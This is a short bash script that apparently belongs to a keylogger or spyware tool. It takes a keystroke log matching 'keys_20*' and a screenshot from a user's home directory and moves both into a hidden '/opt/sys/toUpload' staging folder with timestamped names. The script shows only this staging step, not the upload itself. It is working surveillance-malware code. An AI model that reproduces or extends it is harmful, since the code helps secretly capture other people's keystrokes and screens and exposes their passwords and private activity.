#!/bin/bash

uploadSourcePath="/opt/sys/toUpload"
screenshotPath="/opt/sys/shots"
logPath="/opt/sys/log"
srcPath="/opt/sys/src"

dateTime=`date '+%F_%T'`

cd $logPath
sourceFile=`ls | grep "keys_20*"`

mv $sourceFile $uploadSourcePath/$sourceFile.txt

cd $screenshotPath
mv /home/mayankgupta/tempCache.png $uploadSourcePath/$dateTime.png